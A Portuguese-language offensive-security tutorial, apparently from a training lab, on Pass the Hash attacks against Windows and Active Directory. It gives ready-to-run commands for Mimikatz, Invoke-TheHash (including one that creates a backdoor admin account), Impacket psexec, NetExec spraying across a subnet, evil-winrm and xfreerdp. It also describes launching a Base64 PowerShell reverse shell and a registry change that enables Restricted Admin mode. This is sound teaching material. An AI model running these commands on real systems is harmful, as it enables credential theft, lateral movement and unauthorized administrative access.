Um ataque de Pass the Hash (PtH) permite que um atacante se autentique usando um hash de senha NTLM em vez da senha em texto plano, sem precisar quebrá-lo. O ataque funciona porque o hash de senha permanece válido para autenticação até que a senha seja alterada. Atacantes normalmente obtêm esses hashes do banco de dados SAM, do banco de dados NTDS.dit, ou do processo LSASS depois de comprometer um sistema.

O NTLM é um protocolo de autenticação legado do Windows que usa um mecanismo de desafio-resposta para verificar usuários sem transmitir senhas em texto plano. Como os hashes de senha NTLM não usam salt, um atacante consegue se autenticar usando só o hash, sem saber a senha original. Essa fraqueza é o que possibilita ataques de Pass the Hash (PtH), embora o Kerberos seja hoje o protocolo de autenticação padrão no Active Directory.

## Pass the Hash com Mimikatz (Windows)

O [Mimikatz](https://github.com/gentilkiwi/mimikatz) consegue realizar ataques de Pass the Hash usando o módulo `sekurlsa::pth`, que inicia um processo no contexto de um usuário fornecendo o hash NTLM dele em vez da senha. O ataque requer o nome de usuário alvo, o hash NTLM, o domínio (ou nome do computador local) e, opcionalmente, o programa a ser executado, como `cmd.exe`.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Pass the Hash com PowerShell Invoke-TheHash (Windows)

O [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) é uma ferramenta em PowerShell que realiza ataques de Pass the Hash via SMB ou WMI, autenticando com um hash NTLM em vez de uma senha em texto plano. Ele requer o hostname ou IP do alvo, credenciais de usuário válidas (nome de usuário, domínio e hash NTLM) e privilégios administrativos no sistema alvo. Uma vez autenticado, ele consegue executar comandos remotamente, como criar usuários ou realizar tarefas administrativas. Um exemplo via SMB:

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add"
```

O `Invoke-TheHash` também consegue executar comandos remotos via WMI, autenticando com um hash NTLM em vez de uma senha em texto plano. Uma técnica comum é gerar uma reverse shell em PowerShell codificada em Base64 usando **PowerShell #3 (Base64)** do [revshells.com](https://revshells.com). O payload codificado é passado como comando para o `Invoke-WMIExec`, permitindo que seja executado remotamente no alvo. Se um listener do Netcat estiver esperando na máquina do atacante, o alvo se conecta de volta e estabelece uma reverse shell. ## Pass the Hash com Impacket (Linux)

O Impacket fornece várias ferramentas que suportam ataques de Pass the Hash para execução remota de comandos e outras tarefas de pós-exploração. Uma das mais comuns é o [impacket-psexec](https://github.com/fortra/impacket), que se autentica com um hash NTLM e cria um serviço temporário no alvo para obter um shell interativo. Além do `psexec`, o Impacket também inclui alternativas como `wmiexec`, `atexec` e `smbexec`, cada uma usando um método diferente de execução remota. Essas ferramentas permitem que atacantes executem comandos em sistemas Windows remotos sem saber a senha em texto plano do usuário.

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash com NetExec (Linux)

O NetExec é uma ferramenta de pós-exploração que automatiza autenticação e avaliações de segurança em ambientes de Active Directory. Ele consegue usar Pass the Hash para testar credenciais contra múltiplos hosts, ajudando a identificar sistemas onde o atacante tem acesso de administrador local. Essa técnica costuma estar associada a password spraying, embora tentativas repetidas de autenticação contra contas de domínio possam disparar bloqueios de conta. Para reduzir esse risco, atacantes podem mirar contas locais, limitando as tentativas de autenticação a um único login por host.

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Usando a opção `--local-auth`, o NetExec tenta autenticação Pass the Hash contra contas de administrador local em vez de contas de domínio, o que é útil para identificar reuso de senha entre múltiplos hosts. Se a saída exibir **Pwn3d!**, isso indica que o hash fornecido tem privilégios de administrador local no sistema alvo, e a opção `-x` pode então ser usada para executar comandos remotos. O reuso de senha de administrador local é uma fraqueza comum causada por imagens de sistema compartilhadas ou senhas idênticas entre endpoints. Uma mitigação recomendada é implementar o **Microsoft Local Administrator Password Solution (LAPS)**, que atribui senhas únicas e rotacionadas regularmente às contas de administrador local.

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash com evil-winrm (Linux)

O [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) suporta autenticação Pass the Hash via Windows Remote Management (WinRM), permitindo que atacantes obtenham uma sessão remota do PowerShell usando um hash NTLM. É uma alternativa útil quando o SMB está indisponível ou quando o WinRM é o protocolo de gerenciamento remoto preferido no sistema alvo.

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash com RDP (Linux)

Pass the Hash também pode ser usado para autenticar via RDP com ferramentas como o `xfreerdp`, fornecendo acesso gráfico ao sistema alvo. Esse ataque requer que o **Restricted Admin Mode** esteja habilitado no alvo, o que pode ser configurado definindo a chave de registro `DisableRestrictedAdmin` como `0` em `HKLM\System\CurrentControlSet\Control\Lsa`; caso contrário, a autenticação RDP com um hash NTLM vai falhar.

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
